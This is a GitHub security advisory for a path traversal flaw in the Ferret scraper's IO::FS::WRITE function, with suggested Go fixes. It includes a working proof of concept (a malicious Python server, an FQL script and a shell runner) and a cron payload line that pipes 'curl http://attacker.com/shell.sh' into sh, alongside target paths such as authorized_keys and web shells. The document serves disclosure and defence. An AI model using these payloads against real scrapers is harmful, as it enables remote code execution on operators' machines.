# [H] Ferret: Path Traversal in IO::FS::WRITE allows arbitrary file write when scraping malicious websites

## Summary
Severity: High
Advisory: GHSA-j6v5-g24h-vg4j
CVE: CVE-2026-34783
CWE: CWE-22, CWE-73
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H (CVSS_V3)
Published: 2026-04-01
Source: https://github.com/advisories/GHSA-j6v5-g24h-vg4j
Type: github-advisory

## Affected
- Go: `github.com/MontFerret/ferret/v2` — affected >=0 <2.0.0-alpha.4
- Go: `github.com/MontFerret/ferret` — affected >=0

## Details
## Summary

A path traversal vulnerability in Ferret's `IO::FS::WRITE` standard library function allows a malicious website to write arbitrary files to the filesystem of the machine running Ferret. When an operator scrapes a website that returns filenames containing `../` sequences, and uses those filenames to construct output paths (a standard scraping pattern), the attacker controls both the destination path and the file content. This can lead to remote code execution via cron jobs, SSH authorized_keys, shell profiles, or web shells.

## Exploitation

The attacker hosts a malicious website. The victim is an operator running Ferret to scrape it. The operator writes a standard scraping query that saves scraped files using filenames from the website -- a completely normal and expected pattern.

### Attack Flow

1. The attacker serves a JSON API with crafted filenames containing `../` traversal:

```json
[
  {"name": "legit-article", "content": "Normal content."},
  {"name": "../../etc/cron.d/evil", "content": "* * * * * root curl http://attacker.com/shell.sh | sh\n"}
]
```

2. The victim runs a standard scraping script:

```fql
LET response = IO::NET::HTTP::GET({url: "http://evil.com/api/articles"})
LET articles = JSON_PARSE(TO_STRING(response))

FOR article IN articles
    LET path = "/tmp/ferret_output/" + article.name + ".txt"
    IO::FS::WRITE(path, TO_BINARY(article.content))
    RETURN { written: path, name: article.name }
```

3. FQL string concatenation produces: `/tmp/ferret_output/../../etc/cron.d/evil.txt`

4. `os.OpenFile` resolves `../..` and writes to `/etc/cron.d/evil.txt` -- outside the intended output directory

5. The attacker achieves arbitrary file write with controlled content, leading to code execution.

### Realistic Targets

| Target Path | Impact |
|-------------|--------|
| `/etc/cron.d/<name>` | Command execution via cron |
| `~/.ssh/authorized_keys` | SSH access to the machine |
| `~/.bashrc` or `~/.profile` | Command execution on next login |
| `/var/www/html/<name>.php` | Web shell |
| Application config files | Credential theft, privilege escalation |

## Proof of Concept

### Files

Three files are provided in the `poc/` directory:

**`evil_server.py`** -- Malicious web server returning traversal payloads:

```python
"""Malicious server that returns filenames with path traversal."""
import json
from http.server import HTTPServer, BaseHTTPRequestHandler

class EvilHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/api/articles":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            payload = [
                {"name": "legit-article",
                 "content": "This is a normal article."},
                {"name": "../../tmp/pwned",
                 "content": "ATTACKER_CONTROLLED_CONTENT\n"
                            "# * * * * * root curl http://attacker.com/shell.sh | sh\n"},
            ]
            self.wfile.write(json.dumps(payload).encode())
        else:
            self.send_response(404)
            self.end_headers()

if __name__ == "__main__":
    server = HTTPServer(("0.0.0.0", 9444), EvilHandler)
    print("Listening on :9444")
    server.serve_forever()
```

**`scrape.fql`** -- Innocent-looking Ferret scraping script:

```fql
LET response = IO::NET::HTTP::GET({url: "http://127.0.0.1:9444/api/articles"})
LET articles = JSON_PARSE(TO_STRING(response))

FOR article IN articles
    LET path = "/tmp/ferret_output/" + article.name + ".txt"
    LET data = TO_BINARY(article.content)
    IO::FS::WRITE(path, data)
    RETURN { written: path, name: article.name }
```

**`run_poc.sh`** -- Orchestration script (expects the server to be running separately):

```bash
#!/bin/bash
set -e
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"
FERRET="$REPO_ROOT/bin/ferret"

echo "=== Ferret Path Traversal PoC ==="
[ ! -f "$FERRET" ] && (cd "$REPO_ROOT" && go build -o ./bin/ferret ./test/e2e/cli.go)

rm -rf /tmp/ferret_output && rm -f /tmp/pwned.txt && mkdir -p /tmp/ferret_output

echo "[*] Running scrape script..."
"$FERRET" "$SCRIPT_DIR/scrape.fql" 2>/dev/null || true

if [ -f "/tmp/pwned.txt" ]; then
    echo "[!] VULNERABILITY CONFIRMED: /tmp/pwned.txt written OUTSIDE output directory"
    cat /tmp/pwned.txt
fi
```

### Reproduction Steps

```bash
# Terminal 1: start malicious server
python3 poc/evil_server.py

# Terminal 2: build and run
go build -o ./bin/ferret ./test/e2e/cli.go
bash poc/run_poc.sh

# Verify: /tmp/pwned.txt exists outside /tmp/ferret_output/
cat /tmp/pwned.txt
```

### Observed Output

```
=== Ferret Path Traversal PoC ===

[*] Running innocent-looking scrape script...

[{"written":"/tmp/ferret_output/legit-article.txt","name":"legit-article"},
 {"written":"/tmp/ferret_output/../../tmp/pwned.txt","name":"../../tmp/pwned"}]

=== Results ===

[*] Files in intended output directory (/tmp/ferret_output/):
-rw-r--r--  1 user user  46 Mar 27 18:23 legit-article.txt

[!] VULNERABILITY CONFIRMED: /tmp/pwned.txt exists OUTSIDE the output directory!

    Contents:
    ATTACKER_CONTROLLED_CONTENT
    # * * * * * root curl http://attacker.com/shell.sh | sh
```

## Suggested Fix

### Option 1: Reject path traversal in `IO::FS::WRITE` and `IO::FS::READ`

Resolve the path and verify it doesn't contain `..` after cleaning:

```go
func safePath(userPath string) (string, error) {
    cleaned := filepath.Clean(userPath)
    if strings.Contains(cleaned, "..") {
        return "", fmt.Errorf("path traversal detected: %q", userPath)
    }
    return cleaned, nil
}
```

### Option 2: Base directory enforcement (stronger)

Add an optional base directory that FS operations are jailed to:

```go
func safePathWithBase(base, userPath string) (string, error) {
    absBase, _ := filepath.Abs(base)
    full := filepath.Join(absBase, filepath.Clean(userPath))
    resolved, err := filepath.EvalSymlinks(full)
    if err != nil {
        return "", err
    }
    if !strings.HasPrefix(resolved, absBase+string(filepath.Separator)) {
        return "", fmt.Errorf("path %q escapes base directory %q", userPath, base)
    }
    return resolved, nil
}
```
## Root Cause

`IO::FS::WRITE` in `pkg/stdlib/io/fs/write.go` passes user-supplied file paths directly to `os.OpenFile` with no sanitization:

```go
file, err := os.OpenFile(string(fpath), params.ModeFlag, 0666)
```

There is no:
- Path canonicalization (`filepath.Clean`, `filepath.Abs`, `filepath.EvalSymlinks`)
- Base directory enforcement (checking the resolved path stays within an intended directory)
- Traversal sequence rejection (blocking `..` components)
- Symlink resolution

The same issue exists in `IO::FS::READ` (`pkg/stdlib/io/fs/read.go`):

```go
data, err := os.ReadFile(path.String())
```

The `PATH::CLEAN` and `PATH::JOIN` standard library functions do **not** mitigate this because they use Go's `path` package (URL-style paths), not `path/filepath`, and even `path.Join("/output", "../../etc/cron.d/evil")` resolves to `/etc/cron.d/evil` -- it normalizes the traversal rather than blocking it.

## References
- https://github.com/MontFerret/ferret/security/advisories/GHSA-j6v5-g24h-vg4j
- https://nvd.nist.gov/vuln/detail/CVE-2026-34783
- https://github.com/MontFerret/ferret/commit/160ebad6bd50f153453e120f6d909f5b83322917
- https://github.com/MontFerret/ferret
